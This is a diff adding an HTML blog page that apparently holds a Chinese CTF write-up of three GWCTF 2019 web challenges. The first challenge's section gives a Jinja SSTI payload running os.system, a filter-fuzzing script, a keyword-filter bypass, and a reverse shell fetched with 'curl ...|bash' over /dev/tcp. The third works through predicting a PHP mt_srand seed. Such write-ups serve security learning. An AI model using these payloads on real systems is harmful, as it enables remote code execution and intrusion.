@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>GWCTF 2019-web | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="GWCTF 2019-webGWCTF 2019-web 练习[GWCTF 2019]你的名字 猜这里有SSTI 发现这里强过滤了， 1&amp;#123;&amp;#123;&amp;#125;&amp;#125;  只要一用就报错，所以使用 1&amp;#123;% %&amp;#125;    构造exp: 1&amp;#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GWCTF 2019-web">
+<meta property="og:url" content="http://yoursite.com/2020/02/21/GWCTF-2019-web/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="GWCTF 2019-webGWCTF 2019-web 练习[GWCTF 2019]你的名字 猜这里有SSTI 发现这里强过滤了， 1&amp;#123;&amp;#123;&amp;#125;&amp;#125;  只要一用就报错，所以使用 1&amp;#123;% %&amp;#125;    构造exp: 1&amp;#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/.com//1.png">
+<meta property="og:image" content="http://yoursite.com/.com//2.png">
+<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="og:image" content="http://yoursite.com/.com//4.png">
+<meta property="og:image" content="http://yoursite.com/.com//5.png">
+<meta property="og:image" content="http://yoursite.com/.com//6.png">
+<meta property="og:image" content="http://yoursite.com/.com//7.png">
+<meta property="article:published_time" content="2020-02-21T13:41:04.000Z">
+<meta property="article:modified_time" content="2020-03-26T06:05:16.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-GWCTF-2019-web" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/21/GWCTF-2019-web/" class="article-date">
+  <time datetime="2020-02-21T13:41:04.000Z" itemprop="datePublished">2020-02-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      GWCTF 2019-web
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="GWCTF-2019-web"><a href="#GWCTF-2019-web" class="headerlink" title="GWCTF 2019-web"></a>GWCTF 2019-web</h1><p>GWCTF 2019-web</p>
+<h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p><img src="/.com//1.png" alt="image-20200324112248986"></p>
+<p>猜这里有SSTI</p>
+<p>发现这里强过滤了，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要一用就报错，所以使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.<span class="keyword">__class__</span>.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].os.system(<span class="string">'执行的命令'</span>) %&#125;<span class="number">1</span>&#123;% <span class="keyword">endif</span> %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里记一个<code>FUzz-SSTI</code>的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">dic = [<span class="string">'class'</span>, <span class="string">'bases'</span>, <span class="string">'subclasses'</span>, <span class="string">'['</span>, <span class="string">'('</span>, <span class="string">'read'</span>, <span class="string">'mro'</span>, <span class="string">'init'</span>, <span class="string">'globals'</span>, <span class="string">'builtins'</span>, <span class="string">'file'</span>, <span class="string">'func_globals'</span>, <span class="string">'linecache'</span>, <span class="string">'system'</span>, <span class="string">'values'</span>, <span class="string">'import'</span>, <span class="string">'module'</span>, <span class="string">'call'</span>, <span class="string">'name'</span>, <span class="string">'getitem'</span>, <span class="string">'pop'</span>, <span class="string">'args'</span>, <span class="string">'path'</span>, <span class="string">'popen'</span>, <span class="string">'eval'</span>, <span class="string">'end'</span>, <span class="string">'for'</span>, <span class="string">'if'</span>, <span class="string">'config'</span>]</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://24702b70-5fd1-4537-9f46-e3826566a052.node3.buuoj.cn/"</span>        </span><br><span class="line">pass_dic = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"ads"</span>+i+<span class="string">"ads"</span></span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> len(res.text) == <span class="number">1194</span>:</span><br><span class="line">        pass_dic.append(i)</span><br><span class="line">        print(pass_dic)</span><br></pre></td></tr></table></figure>
+
+<p>被过滤掉的字符有</p>
+<p><img src="/.com//2.png" alt="image-20200324191111500"></p>
+<p>发现<code>iconfigf</code>可以绕过对关键词的过滤</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconfigf ==&gt; if</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过SSTI以及<code>curl</code>反弹shell</p>
+<p>在内网开一个主机，在index.html写上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">174.1</span><span class="number">.90</span><span class="number">.244</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>exp改为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__clconfigass__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].oconfigs.system(<span class="string">'curl 174.1.90.244|bash'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>考点：CVE-2018-12613</p>
+<p><img src="/.com//3.png" alt="image-20200325083832042"></p>
+<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>考点：随机数预测</p>
+<p><code>check.php</code>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><code>mt_srand</code>生成的种子是可以爆破的。</p>
+<p>先使用脚本把随机数转换一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2 = <span class="string">'MAijTMEfFK'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">' '</span> + str(j) + <span class="string">' '</span> + <span class="string">'0'</span> + <span class="string">' '</span> + str(len(str1)<span class="number">-1</span>) + <span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//4.png" alt="image-20200325085411806"></p>
+<p>接着是使用<code>php_mt_seed</code>将种子爆破出来</p>
+<p><img src="/.com//5.png" alt="image-20200325085757343"></p>
+<p>然后爆破</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">48815515</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line">$len1 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len1; $i++) &#123;</span><br><span class="line">    $str .= substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span> . $str . <span class="string">"&lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.com//6.png" alt="image-20200325090016209"></p>
+<p>提交获得flag</p>
+<p><img src="/.com//7.png" alt="image-20200325090046508"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/21/GWCTF-2019-web/" data-id="ck8sqr5i3000ckou5e90575bh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/25/DC9-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DC9-vulnhub渗透测试
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/17/ThinkPHP-5-0-0-5-0-23-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/someting/" rel="tag">someting</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/someting/" style="font-size: 10px;">someting</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/04/09/MRCTF2020-web/">MRCTF2020-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/30/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">thinkphp5.1反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/20/BJDCTF-2nd/">BJDCTF-2nd</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
